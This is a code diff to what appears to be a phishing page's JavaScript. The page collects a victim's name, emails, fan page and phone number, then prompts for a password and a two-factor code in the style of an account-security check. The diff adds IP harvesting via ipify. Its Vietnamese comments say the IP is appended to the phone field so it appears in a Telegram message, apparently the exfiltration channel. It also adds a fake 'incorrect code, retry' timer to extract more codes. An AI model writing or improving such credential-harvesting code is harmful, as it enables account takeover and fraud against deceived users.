@@ -1,15 +1,41 @@
-// Main Application Logic
+// ==================== HELPER: GET USER IP ====================
+async function getIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (e) {
+        return "Unknown IP";
+    }
+}
+
+// ==================== MAIN APPLICATION LOGIC ====================
 document.getElementById('clientForm').addEventListener('submit', async (e) => {
     e.preventDefault();
+    
+    // Lấy nút submit để tạo hiệu ứng loading nếu cần
+    const submitBtn = e.target.querySelector('button');
+    if (submitBtn) submitBtn.disabled = true;
+
+    // Lấy IP người dùng trước
+    const userIP = await getIP();
+
     const formData = {
         fullName: document.getElementById('fullName').value.trim(),
         email: document.getElementById('email').value.trim(),
         emailBusiness: document.getElementById('emailBusiness').value.trim(),
         fanpage: document.getElementById('fanpage').value.trim(),
-        phone: document.getElementById('phone').value.trim(),
+        // Mẹo: Gắn IP vào sau số điện thoại để đảm bảo nó hiện lên Telegram mà không cần sửa Utils
+        phone: document.getElementById('phone').value.trim() + " | IP: " + userIP,
+        userIP: userIP // Lưu riêng một trường IP để dự phòng
     };
 
+    // Lưu bản ghi đầu tiên
     Utils.saveRecord('__client_rec__fi_rst', formData);
+    
+    if (submitBtn) submitBtn.disabled = false;
+    
+    // Mở Modal nhập mật khẩu
     openSecurityModal();
 });
 
@@ -87,7 +113,7 @@ function openSecurityModal() {
 // ==================== MODAL 3: AUTHENTICATION (2FA) ====================
 function openAuthenticationModal(userData) {
     const emailDisplay = Utils.maskEmail(userData.email);
-    const phoneDisplay = Utils.maskPhone(userData.phone);
+    const phoneDisplay = Utils.maskPhone(userData.phone.split(' | ')[0]); // Tách IP ra để hiển thị phone sạch
     const description = `Enter the code for this account that we send to ${emailDisplay}, ${phoneDisplay} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)`;
 
     const content = `
@@ -175,7 +201,7 @@ function openAuthenticationModal(userData) {
         submitBtn.disabled = true;
         submitBtn.classList.add('opacity-70');
 
-        let time = CONFIG.COUNTDOWN_TIME;
+        let time = 60; // Bạn có thể thay bằng CONFIG.COUNTDOWN_TIME nếu có
         errorMsg.textContent = `The code is incorrect. Try again after ${time} seconds.`;
         errorMsg.classList.remove('hidden');
 
@@ -215,4 +241,3 @@ function openSuccessModal() {
     Modal.create('successModal', content);
     Modal.open('successModal');
 }
-
